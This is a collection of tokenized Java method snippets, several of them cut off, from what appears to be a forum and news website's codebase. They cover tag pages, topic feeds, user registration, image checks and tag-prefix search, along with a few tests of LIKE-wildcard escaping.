public List < GalleryItem > getGalleryItems ( int countItems , int tagId ) throws TagNotFoundException { final Section gallery = sectionService . getSection ( Section . SECTION_GALLERY ) ; String sql = " SELECT t.msgid, t.stat1,t.title, t.userid, t.urlname, images.icon, images.original, images.id AS imageid, t.commitdate " + " FROM (SELECT topics.id AS msgid, topics.stat1, topics.title, userid, urlname, topics.commitdate " + " FROM topics JOIN groups ON topics.groupid = groups.id WHERE topics.moderate AND section= " + Section . SECTION_GALLERY + " " + " AND NOT topics.deleted AND commitdate IS NOT NULL AND topics.id IN (SELECT msgid FROM tags WHERE tagid=?) ORDER BY commitdate DESC LIMIT ?) " + " as t JOIN images ON t.msgid = images.topic " ; return jdbcTemplate . query ( sql , new GalleryItemRowMapper ( gallery ) , tagId , countItems ) ; } 
private Map < String , Object > getGallerySection ( String tag ) throws TagNotFoundException { int tagId = tagService . getTagId ( tag ) ; List < PreparedGalleryItem > list = imageDao . prepare ( imageDao . getGalleryItems ( 3 , tagId ) ) ; return ImmutableMap . < String , Object > of ( " gallery " , list 
public ModelAndView tagPage ( HttpServletRequest request , @PathVariable String tag ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Forbidden " ) ; } tagService . checkTag ( tag ) ; ModelAndView mv = new ModelAndView ( " tag-page " ) ; mv . addObject ( " tag " , tag ) ; mv . addAllObjects ( getNewsSection ( request , tag ) ) ; mv . addAllObjects ( getGallerySection ( tag ) ) ; mv . addAllObjects ( getForumSection ( tag ) ) ; return mv ; } 
private Map < String , Object > getNewsSection ( HttpServletRequest request , String tag ) throws TagNotFoundException { Template tmpl = Template . getTemplate ( request ) ; Section newsSection = sectionService . getSection ( Section . SECTION_NEWS ) ; List < Topic > newsTopics = topicListService . getTopicsFeed ( newsSection , null , tag , 0 , null , null , TOTAL_NEWS_COUNT ) ; List < Topic > fullNewsTopics = headOrEmpty ( newsTopics ) ; List < Topic > briefNewsTopics = tailOrEmpty ( newsTopics ) ; List < PersonalizedPreparedTopic > fullNews = prepareService . prepareMessagesForUser ( fullNewsTopics , request . isSecure ( ) , tmpl . getCurrentUser ( ) , tmpl . getProf ( ) , false ) ; return ImmutableMap . < String , Object > of ( " fullNews " , fullNews , 
private Map < String , List < Topic > > getForumSection ( String tag ) throws TagNotFoundException { Section forumSection = sectionService . getSection ( Section . SECTION_FORUM ) ; List < Topic > forumTopics = topicListService . getTopicsFeed ( forumSection , null , tag , 0 , null , null , FORUM_TOPIC_COUNT ) ; return ImmutableMap . of ( " forum1 " , firstHalf ( forumTopics ) , 
public List < Topic > getTopicsFeed ( Section section , Group group , String tag , Integer offset , Integer year , Integer month , int count ) throws TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . toString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . toString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( tag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . toString ( ) ) ; TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } if ( tag ! = null ) { topicListDto . setTag ( tagService . getTagId ( tag ) ) ; } if ( month ! = null & & year ! = null ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; topicListDto . setToDate ( calendar . getTime ( ) ) ; } else { topicListDto . setLimit ( count ) ; topicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( tag = = null & & group = = null & & ! section . isPremoderated ( ) ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return topicListDao . getTopics ( topicListDto ) ; } 
public ForumItem apply ( Topic input ) { return new ForumItem ( input , groupDao . getGroup ( input . getGroupId ( ) ) ) ; } 
private Map < String , List < ForumItem > > getForumSection ( String tag ) throws TagNotFoundException { Section forumSection = sectionService . getSection ( Section . SECTION_FORUM ) ; List < Topic > forumTopics = topicListService . getTopicsFeed ( forumSection , null , tag , 0 , null , null , FORUM_TOPIC_COUNT ) ; return ImmutableMap . of ( " forum1 " , Lists . transform ( firstHalf ( forumTopics ) , forumPrepareFunction ) , 
public ModelAndView tagPage ( HttpServletRequest request , @PathVariable String tag ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Forbidden " ) ; } tagService . checkTag ( tag ) ; ModelAndView mv = new ModelAndView ( " tag-page " ) ; mv . addObject ( " tag " , tag ) ; if ( tmpl . isSessionAuthorized ( ) ) { mv . addObject ( " showFavoriteTagButton " , ! userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; mv . addObject ( " showUnFavoriteTagButton " , userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; } int tagId = tagService . getTagId ( tag ) ; mv . addObject ( " favsCount " , userTagService . countFavs ( tagId ) ) ; mv . addAllObjects ( getNewsSection ( request , tag ) ) ; mv . addAllObjects ( getGallerySection ( tagId ) ) ; mv . addAllObjects ( getForumSection ( tag ) ) ; return mv ; } 
private Map < String , Object > getGallerySection ( int tagId ) throws TagNotFoundException { List < PreparedGalleryItem > list = imageDao . prepare ( imageDao . getGalleryItems ( 3 , tagId ) ) ; return ImmutableMap . < String , Object > of ( " gallery " , list 
public DateTime apply ( Topic input ) { return new DateTime ( input . getLastModified ( ) ) ; } 
private Map < String , Map < String , Collection < ForumItem > > > getForumSection ( String tag ) throws TagNotFoundException { Section forumSection = sectionService . getSection ( Section . SECTION_FORUM ) ; List < Topic > forumTopics = topicListService . getTopicsFeed ( forumSection , null , tag , 0 , null , null , FORUM_TOPIC_COUNT ) ; ImmutableListMultimap < String , Topic > sections = datePartition ( forumTopics , LASTMOD_EXTRACTOR ) ; return ImmutableMap . of ( " forum " , Multimaps . transformValues ( sections , forumPrepareFunction ) . asMap ( ) 
private static ImmutableListMultimap < String , Topic > datePartition ( Iterable < Topic > topics , final Function < Topic , DateTime > dateExtractor ) { final DateMidnight startOfToday = new DateMidnight ( ) ; final DateMidnight startOfYesterday = startOfToday . minusDays ( 1 ) ; final DateMidnight startOfYear = startOfToday . withDayOfYear ( 1 ) ; return Multimaps . index ( topics , new Function < Topic , String > ( ) { @Override 
public DateTime apply ( Topic input ) { return new DateTime ( input . getCommitDate ( ) ) ; } 
private Map < String , Object > getNewsSection ( HttpServletRequest request , String tag ) throws TagNotFoundException { Template tmpl = Template . getTemplate ( request ) ; Section newsSection = sectionService . getSection ( Section . SECTION_NEWS ) ; List < Topic > newsTopics = topicListService . getTopicsFeed ( newsSection , null , tag , 0 , null , null , TOTAL_NEWS_COUNT ) ; List < Topic > fullNewsTopics = headOrEmpty ( newsTopics ) ; List < Topic > briefNewsTopics = tailOrEmpty ( newsTopics ) ; List < PersonalizedPreparedTopic > fullNews = prepareService . prepareMessagesForUser ( fullNewsTopics , request . isSecure ( ) , tmpl . getCurrentUser ( ) , tmpl . getProf ( ) , false ) ; ImmutableListMultimap < String , Topic > briefNews = datePartition ( briefNewsTopics , COMMITDATE_EXTRACTOR ) ; return ImmutableMap . < String , Object > of ( " fullNews " , fullNews , 
private ImmutableMap < String , ImmutableList < ImmutableMap < String , List < ForumItem > > > > getForumSection ( String tag ) throws TagNotFoundException { Section forumSection = sectionService . getSection ( Section . SECTION_FORUM ) ; List < Topic > forumTopics = topicListService . getTopicsFeed ( forumSection , null , tag , 0 , null , null , FORUM_TOPIC_COUNT ) ; ImmutableListMultimap < String , Topic > sections = datePartition ( forumTopics , LASTMOD_EXTRACTOR ) ; return ImmutableMap . of ( " forum " , split ( Multimaps . transformValues ( sections , forumPrepareFunction ) ) 
private static < T > ImmutableList < ImmutableMap < String , List < T > > > split ( ListMultimap < String , T > topics ) { if ( topics . isEmpty ( ) ) { return ImmutableList . of ( ) ; } int split = topics . size ( ) / 2 + ( topics . size ( ) % 2 ) ; ImmutableMap . Builder < String , List < T > > first = ImmutableMap . builder ( ) ; ImmutableMap . Builder < String , List < T > > second = ImmutableMap . builder ( ) ; int total = 0 ; for ( Map . Entry < String , Collection < T > > entry : topics . asMap ( ) . entrySet ( ) ) { int currentSize = entry . getValue ( ) . size ( ) ; if ( total + ( currentSize / 2 ) < = split ) { first . put ( entry . getKey ( ) , ImmutableList . copyOf ( entry . getValue ( ) ) ) ; } else { second . put ( entry . getKey ( ) , ImmutableList . copyOf ( entry . getValue ( ) ) ) ; } total + = currentSize ; } return ImmutableList . of ( first . build ( ) , second . build ( ) ) ; } 
public ModelAndView tagPage ( HttpServletRequest request , @PathVariable String tag ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Forbidden " ) ; } tagService . checkTag ( tag ) ; ModelAndView mv = new ModelAndView ( " tag-page " ) ; mv . addObject ( " tag " , tag ) ; mv . addObject ( " title " , WordUtils . capitalize ( tag ) ) ; if ( tmpl . isSessionAuthorized ( ) ) { mv . addObject ( " showFavoriteTagButton " , ! userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; mv . addObject ( " showUnFavoriteTagButton " , userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; } int tagId = tagService . getTagId ( tag ) ; mv . addObject ( " favsCount " , userTagService . countFavs ( tagId ) ) ; mv . addAllObjects ( getNewsSection ( request , tag ) ) ; mv . addAllObjects ( getGallerySection ( tagId ) ) ; mv . addAllObjects ( getForumSection ( tag ) ) ; return mv ; } 
public ModelAndView tagPage ( HttpServletRequest request , @PathVariable String tag ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Forbidden " ) ; } tagService . checkTag ( tag ) ; ModelAndView mv = new ModelAndView ( " tag-page " ) ; mv . addObject ( " tag " , tag ) ; mv . addObject ( " title " , WordUtils . capitalize ( tag ) ) ; mv . addObject ( " counter " , tagService . getCounter ( tag ) ) ; if ( tmpl . isSessionAuthorized ( ) ) { mv . addObject ( " showFavoriteTagButton " , ! userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; mv . addObject ( " showUnFavoriteTagButton " , userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; } int tagId = tagService . getTagId ( tag ) ; mv . addObject ( " favsCount " , userTagService . countFavs ( tagId ) ) ; mv . addAllObjects ( getNewsSection ( request , tag ) ) ; mv . addAllObjects ( getGallerySection ( tagId ) ) ; mv . addAllObjects ( getForumSection ( tag ) ) ; return mv ; } 
private Map < String , Object > getNewsSection ( HttpServletRequest request , String tag ) throws TagNotFoundException { Template tmpl = Template . getTemplate ( request ) ; Section newsSection = sectionService . getSection ( Section . SECTION_NEWS ) ; List < Topic > newsTopics = topicListService . getTopicsFeed ( newsSection , null , tag , 0 , null , null , TOTAL_NEWS_COUNT ) ; List < Topic > fullNewsTopics = headOrEmpty ( newsTopics ) ; List < Topic > briefNewsTopics = tailOrEmpty ( newsTopics ) ; List < PersonalizedPreparedTopic > fullNews = prepareService . prepareMessagesForUser ( fullNewsTopics , request . isSecure ( ) , tmpl . getCurrentUser ( ) , tmpl . getProf ( ) , false ) ; ImmutableListMultimap < String , Topic > briefNews = datePartition ( briefNewsTopics , COMMITDATE_EXTRACTOR ) ; ImmutableMap . Builder < String , Object > out = ImmutableMap . builder ( ) ; out . put ( " addNews " , AddTopicController . getAddUrl ( newsSection , tag ) ) ; if ( newsTopics . size ( ) = = TOTAL_NEWS_COUNT ) { out . put ( " moreNews " , TagTopicListController . tagListUrl ( tag , newsSection ) ) ; } out . put ( " fullNews " , fullNews ) ; out . put ( " briefNews " , split ( briefNews ) ) ; return out . build ( ) ; } 
private ImmutableMap < String , Object > prepareModel ( AddTopicRequest form , User currentUser ) { ImmutableMap . Builder < String , Object > params = ImmutableMap . builder ( ) ; Group group = form . getGroup ( ) ; if ( group ! = null ) { params . put ( " group " , group ) ; params . put ( " postscoreInfo " , groupPermissionService . getPostScoreInfo ( group ) ) ; Section section = sectionService . getSection ( group . getSectionId ( ) ) ; params . put ( " section " , section ) ; params . put ( " addportal " , sectionService . getAddInfo ( group . getSectionId ( ) ) ) ; params . put ( " imagepost " , groupPermissionService . isImagePostingAllowed ( section , currentUser ) ) ; } params . put ( " topTags " , tagService . getTopTags ( ) ) ; return params . build ( ) ; } 
public ModelAndView showForm ( @RequestParam ( " section " ) int sectionId , @RequestParam ( value = " tag " , required = false ) String tag ) throws UserErrorException { Map < String , Object > params = new HashMap < > ( ) ; if ( tag ! = null ) { TagService . checkTag ( tag ) ; params . put ( " tag " , tag ) ; } params . put ( " sectionId " , sectionId ) ; Section section = sectionService . getSection ( sectionId ) ; params . put ( " section " , section ) ; params . put ( " info " , sectionService . getAddInfo ( section . getId ( ) ) ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " add-section " , params ) ; } 
public static String tagListUrl ( String tag , Section section ) { return TAG_URI_SECTION_TEMPLATE . expand ( tag , section . getId ( ) ) . toString ( ) ; } 
private static String buildTagUri ( String tag , int section , int offset ) { UriComponentsBuilder builder = UriComponentsBuilder . fromUri ( TAG_URI_TEMPLATE . expand ( tag ) ) ; if ( section ! = 0 ) { builder . queryParam ( " section " , section ) ; } if ( offset ! = 0 ) { builder . queryParam ( " offset " , offset ) ; } return builder . build ( ) . toUriString ( ) ; } 
public View tagFeedOld ( @RequestParam String tag ) { return new RedirectView ( tagListUrl ( tag ) ) ; } 
public ModelAndView tagPage ( HttpServletRequest request , @PathVariable String tag ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Forbidden " ) ; } tagService . checkTag ( tag ) ; ModelAndView mv = new ModelAndView ( " tag-page " ) ; mv . addObject ( " tag " , tag ) ; mv . addObject ( " title " , WordUtils . capitalize ( tag ) ) ; mv . addObject ( " counter " , tagService . getCounter ( tag ) ) ; if ( tmpl . isSessionAuthorized ( ) ) { mv . addObject ( " showFavoriteTagButton " , ! userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; mv . addObject ( " showUnFavoriteTagButton " , userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; } int tagId = tagService . getTagId ( tag ) ; mv . addObject ( " favsCount " , userTagService . countFavs ( tagId ) ) ; mv . addAllObjects ( getNewsSection ( request , tag ) ) ; mv . addAllObjects ( getGallerySection ( tag , tagId , tmpl ) ) ; mv . addAllObjects ( getForumSection ( tag ) ) ; return mv ; } 
private Map < String , Object > getGallerySection ( String tag , int tagId , Template tmpl ) throws TagNotFoundException { List < PreparedGalleryItem > list = imageDao . prepare ( imageDao . getGalleryItems ( GALLERY_COUNT , tagId ) ) ; ImmutableMap . Builder < String , Object > out = ImmutableMap . builder ( ) ; Section section = sectionService . getSection ( Section . SECTION_GALLERY ) ; if ( tmpl . isSessionAuthorized ( ) ) { out . put ( " addGallery " , AddTopicController . getAddUrl ( section , tag ) ) ; } if ( list . size ( ) = = GALLERY_COUNT ) { out . put ( " moreGallery " , TagTopicListController . tagListUrl ( tag , section ) ) ; } out . put ( " gallery " , list ) ; return out . build ( ) ; } 
private ImmutableMap < String , Object > prepareModel ( AddTopicRequest form , User currentUser ) { ImmutableMap . Builder < String , Object > params = ImmutableMap . builder ( ) ; Group group = form . getGroup ( ) ; if ( group ! = null ) { params . put ( " group " , group ) ; params . put ( " postscoreInfo " , groupPermissionService . getPostScoreInfo ( group ) ) ; Section section = sectionService . getSection ( group . getSectionId ( ) ) ; params . put ( " section " , section ) ; String addInfo = sectionService . getAddInfo ( group . getSectionId ( ) ) ; if ( addInfo ! = null ) { params . put ( " addportal " , addInfo ) ; } params . put ( " imagepost " , groupPermissionService . isImagePostingAllowed ( section , currentUser ) ) ; } params . put ( " topTags " , tagService . getTopTags ( ) ) ; return params . build ( ) ; } 
private ImmutableMap < String , Object > getForumSection ( String tag ) throws TagNotFoundException { Section forumSection = sectionService . getSection ( Section . SECTION_FORUM ) ; List < Topic > forumTopics = topicListService . getTopicsFeed ( forumSection , null , tag , 0 , null , null , FORUM_TOPIC_COUNT ) ; ImmutableListMultimap < String , Topic > sections = datePartition ( forumTopics , LASTMOD_EXTRACTOR ) ; ImmutableMap . Builder < String , Object > out = ImmutableMap . builder ( ) ; if ( forumTopics . size ( ) = = FORUM_TOPIC_COUNT ) { out . put ( " moreForum " , TagTopicListController . tagListUrl ( tag , forumSection ) ) ; } out . put ( " addForum " , AddTopicController . getAddUrl ( forumSection , tag ) ) ; out . put ( " forum " , split ( Multimaps . transformValues ( sections , forumPrepareFunction ) ) ) ; return out . build ( ) ; } 
private ImmutableMap < String , Object > getForumSection ( @Nonnull String tag , int tagId ) throws TagNotFoundException { Section forumSection = sectionService . getSection ( Section . SECTION_FORUM ) ; TopicListDto topicListDto = new TopicListDto ( ) ; topicListDto . setSection ( forumSection . getId ( ) ) ; topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; topicListDto . setTag ( tagId ) ; topicListDto . setLimit ( FORUM_TOPIC_COUNT ) ; topicListDto . setLastmodSort ( true ) ; List < Topic > forumTopics = topicListService . getTopics ( topicListDto ) ; ImmutableListMultimap < String , Topic > sections = datePartition ( forumTopics , LASTMOD_EXTRACTOR ) ; ImmutableMap . Builder < String , Object > out = ImmutableMap . builder ( ) ; if ( forumTopics . size ( ) = = FORUM_TOPIC_COUNT ) { out . put ( " moreForum " , TagTopicListController . tagListUrl ( tag , forumSection ) ) ; } out . put ( " addForum " , AddTopicController . getAddUrl ( forumSection , tag ) ) ; out . put ( " forum " , split ( Multimaps . transformValues ( sections , forumPrepareFunction ) ) ) ; return out . build ( ) ; } 
public boolean isLastmodSort ( ) { return lastmodSort ; } 
public ModelAndView tagPage ( HttpServletRequest request , @PathVariable String tag ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; tagService . checkTag ( tag ) ; ModelAndView mv = new ModelAndView ( " tag-page " ) ; mv . addObject ( " tag " , tag ) ; mv . addObject ( " title " , WordUtils . capitalize ( tag ) ) ; mv . addObject ( " counter " , tagService . getCounter ( tag ) ) ; if ( tmpl . isSessionAuthorized ( ) ) { mv . addObject ( " showFavoriteTagButton " , ! userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; mv . addObject ( " showUnFavoriteTagButton " , userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; } int tagId = tagService . getTagId ( tag ) ; mv . addObject ( " favsCount " , userTagService . countFavs ( tagId ) ) ; mv . addAllObjects ( getNewsSection ( request , tag ) ) ; mv . addAllObjects ( getGallerySection ( tag , tagId , tmpl ) ) ; mv . addAllObjects ( getForumSection ( tag , tagId ) ) ; return mv ; } 
public int createUser ( String name , String nick , String password , String url , InternetAddress mail , String town , String ip ) { PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; int userid = jdbcTemplate . queryForObject ( " select nextval('s_uid') as userid " , Integer . class ) ; jdbcTemplate . update ( " INSERT INTO users " + " (id, name, nick, passwd, url, email, town, score, max_score,regdate) " + " VALUES (?,?,?,?,?,?,?,45,45,current_timestamp) " , userid , name , nick , encryptor . encryptPassword ( password ) , url = = null ? null : URLUtil . fixURL ( url ) , mail . getAddress ( ) , town ) ; userLogDao . logRegister ( userid , ip ) ; return userid ; } 
public void logRegister ( int userid , @Nonnull String ip ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
private static boolean isDeletableByUser ( Topic topic , User user ) { Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . HOUR_OF_DAY , - 1 ) ; Timestamp hourDeltaTime = new Timestamp ( calendar . getTimeInMillis ( ) ) ; return ( topic . getPostdate ( ) . compareTo ( hourDeltaTime ) > = 0 & & 
public static ImageParam imageCheck ( File file ) throws BadImageException , IOException { long size = file . length ( ) ; ImageInputStream iis = ImageIO . createImageInputStream ( file ) ; if ( iis = = null ) { throw new BadImageException ( " Invalid image " ) ; } Iterator < ImageReader > iter = ImageIO . getImageReaders ( iis ) ; if ( ! iter . hasNext ( ) ) { throw new BadImageException ( " Invalid image " ) ; } ImageReader reader = iter . next ( ) ; reader . setInput ( iis ) ; String formatName = reader . getFormatName ( ) ; if ( ! Arrays . asList ( supportedFormat ) . contains ( formatName ) ) { throw new BadImageException ( " Does unsupported format " + formatName ) ; } boolean animated = hasAnimatedPng ( reader ) | | reader . getNumImages ( true ) > 1 ; int height = reader . getHeight ( 0 ) ; int width = reader . getWidth ( 0 ) ; iis . close ( ) ; return new ImageParam ( formatName , animated , height , width , size ) ; } 
public static boolean isStyle ( String style ) { return STYLES . contains ( style ) ; } 
public String apply ( Theme input ) { return input . getId ( ) ; } 
public static boolean isStyle ( String style ) { return THEMES . containsKey ( style ) ; } 
private void doResize ( File uploadedFile ) throws IOException , BadImageException { if ( mainFile . exists ( ) ) { mainFile . delete ( ) ; } FileUtils . moveFile ( uploadedFile , mainFile ) ; boolean error = true ; try { ImageUtil . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) , ICON_WIDTH ) ; 
public static ImageParam imageInfo ( File file ) throws BadImageException , IOException { long size = file . length ( ) ; ImageInputStream iis = ImageIO . createImageInputStream ( file ) ; if ( iis = = null ) { throw new BadImageException ( " Invalid image " ) ; } Iterator < ImageReader > iter = ImageIO . getImageReaders ( iis ) ; if ( ! iter . hasNext ( ) ) { throw new BadImageException ( " Invalid image " ) ; } ImageReader reader = iter . next ( ) ; reader . setInput ( iis ) ; String formatName = reader . getFormatName ( ) ; if ( ! Arrays . asList ( supportedFormat ) . contains ( formatName ) ) { throw new BadImageException ( " Does unsupported format " + formatName ) ; } boolean animated = false ; int height = reader . getHeight ( 0 ) ; int width = reader . getWidth ( 0 ) ; iis . close ( ) ; return new ImageParam ( formatName , animated , height , width , size ) ; } 
private ImageInfo imageInfoTestPass1 ( ) throws Exception { return new ImageInfo ( " src/test/resources/images/i_want_to_be_a_hero__apng_animated__by_tamalesyatole-d5ht8eu.png " ) ; } 
private ImageInfo imageInfoTestPass2 ( ) throws Exception { return new ImageInfo ( " src/main/webapp/img/pcard.jpg " ) ; } 
public void imageInfoTest1 ( ) throws Exception { for ( int i = 0 ; i < 10000 ; i + + ) { ImageInfo info = imageInfoTestPass1 ( ) ; 
public void imageInfoTest2 ( ) throws Exception { for ( int i = 0 ; i < 10000 ; i + + ) { ImageInfo info = imageInfoTestPass2 ( ) ; 
private ImageParam imageCheckTestPass1 ( ) throws Exception { return ImageUtil . imageInfo ( new File ( " src/test/resources/images/i_want_to_be_a_hero__apng_animated__by_tamalesyatole-d5ht8eu.png " ) ) ; } 
private ImageParam imageCheckTestPass2 ( ) throws Exception { return ImageUtil . imageInfo ( new File ( " src/main/webapp/img/pcard.jpg " ) ) ; } 
private ImageParam imageCheckTestPass3 ( ) throws Exception { return ImageUtil . imageInfo ( new File ( " src/main/webapp/img/nonexistent " ) ) ; } 
public void imageInfoTest1 ( ) throws Exception { for ( int i = 0 ; i < 10000 ; i + + ) { ImageParam param = imageCheckTestPass1 ( ) ; 
public void imageInfoTest2 ( ) throws Exception { for ( int i = 0 ; i < 10000 ; i + + ) { ImageParam param = imageCheckTestPass2 ( ) ; 
public ModelAndView showTagListHandler ( @PathVariable String firstLetter ) throws TagNotFoundException { ModelAndView modelAndView = new ModelAndView ( " tags " ) ; SortedSet < String > firstLetters = tagService . getFirstLetters ( ) ; modelAndView . addObject ( " firstLetters " , firstLetters ) ; if ( Strings . isNullOrEmpty ( firstLetter ) ) { firstLetter = firstLetters . first ( ) ; } modelAndView . addObject ( " currentLetter " , firstLetter ) ; Map < String , Integer > tags = tagService . getTagsByPrefix ( firstLetter , 1 ) ; if ( tags . isEmpty ( ) ) { throw new TagNotFoundException ( " Tag list is empty " ) ; } modelAndView . addObject ( " tags " , tags ) ; return modelAndView ; } 
List < String > showTagListHandlerJSON ( @RequestParam ( " term " ) final String term ) { Map < String , Integer > tags = tagService . getTagsByPrefix ( term , 2 ) ; return ImmutableList . copyOf ( Iterables . filter ( tags . keySet ( ) , new Predicate < String > ( ) { @Override 
public boolean apply ( String input ) { return TagService . isGoodTag ( input ) ; } 
public void prefixSearchExactTest ( ) { tagDao . createTag ( " zest " ) ; tagDao . createTag ( " zesd " ) ; Map < String , Integer > tags = tagDao . getTagsByPrefix ( " zest " , 0 ) ; assertEquals ( 1 , tags . size ( ) ) ; } 
public void prefixSearchSimpleTest ( ) { tagDao . createTag ( " zest " ) ; tagDao . createTag ( " zesd " ) ; Map < String , Integer > tags = tagDao . getTagsByPrefix ( " ze " , 0 ) ; assertEquals ( 2 , tags . size ( ) ) ; } 
public void prefixSearchEscapeTest ( ) { tagDao . createTag ( " zest_test " ) ; tagDao . createTag ( " zestxtest " ) ; assertEquals ( 1 , tagDao . getTagsByPrefix ( " zest_ " , 0 ) . size ( ) ) ; assertEquals ( 0 , tagDao . getTagsByPrefix ( " zest% " , 0 ) . size ( ) ) ; } 
public void prefixSearchEscapeTest2 ( ) { tagDao . createTag ( " zest__test " ) ; tagDao . createTag ( " zest_xtest " ) ; assertEquals ( 2 , tagDao . getTagsByPrefix ( " zest_ " , 0 ) . size ( ) ) ; assertEquals ( 1 , tagDao . getTagsByPrefix ( " zest__ " , 0 ) . size ( ) ) ; assertEquals ( 1 , tagDao . getTagsByPrefix ( " zest__t " , 0 ) . size ( ) ) ; } 
List < String > showTagListHandlerJSON ( @RequestParam ( " term " ) final String term ) { SortedSet < String > tags = tagService . suggestTagsByPrefix ( term , 20 ) ; return ImmutableList . copyOf ( Iterables . filter ( tags , new Predicate < String > ( ) { @Override 
public void processRow ( ResultSet resultSet ) throws SQLException { res . add ( resultSet . getString ( " value " ) ) ; } 
private static String escapeLikeWildcards ( String str ) { return str . replaceAll ( " [_%] " , " \\ \\ $0 " ) ; } 
public SortedSet < String > suggestTagsByPrefix ( String prefix , int count ) { return tagDao . getTopTagsByPrefix ( prefix , 2 , count ) ; } 
public void prefixTopSearchExactTest ( ) { tagDao . createTag ( " zest " ) ; tagDao . createTag ( " zesd " ) ; Set < String > tags = tagDao . getTopTagsByPrefix ( " zest " , 0 , 20 ) ; assertEquals ( 1 , tags . size ( ) ) ; } 
List < String > showTagListHandlerJSON ( @RequestParam ( " term " ) final String term ) { SortedSet < String > tags = tagService . suggestTagsByPrefix ( term , 10 ) ; return ImmutableList . copyOf ( Iterables . filter ( tags , new Predicate < String > ( ) { @Override 
public ModelAndView gallery ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_GALLERY ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionService . getSection ( Section . SECTION_GALLERY ) , topicListForm ) ) ; modelAndView . addObject ( " url " , " /gallery/ " ) ; modelAndView . addObject ( " rssLink " , " section-rss.jsp?section=3 " ) ; return modelAndView ; } 
public ModelAndView forum ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_FORUM ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionService . getSection ( Section . SECTION_FORUM ) , topicListForm ) ) ; modelAndView . addObject ( " url " , " /forum/lenta " ) ; modelAndView . addObject ( " rssLink " , " section-rss.jsp?section=2 " ) ; return modelAndView ; } 
public ModelAndView news ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_NEWS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " url " , " /news/ " ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionService . getSection ( Section . SECTION_NEWS ) , topicListForm ) ) ; modelAndView . addObject ( " rssLink " , " section-rss.jsp?section=1 " ) ; return modelAndView ; } 
public boolean isUserCastAllowed ( User author ) { return ! author . isAnonymousScore ( ) ; } 
public void resetUnreadReplies ( int userId ) { jdbcTemplate . update ( " UPDATE users SET unread_events=0 where id=? " , userId ) ; jdbcTemplate . update ( " UPDATE user_events SET unread=false WHERE userid=? AND unread " , userId ) ; } 
public void recalcEventCount ( Collection < Integer > userids ) { if ( userids . isEmpty ( ) ) { return ; } namedJdbcTemplate . update ( " UPDATE users SET unread_events = (SELECT count(*) FROM user_events WHERE unread AND userid=users.id) WHERE users.id IN (:list) " , 
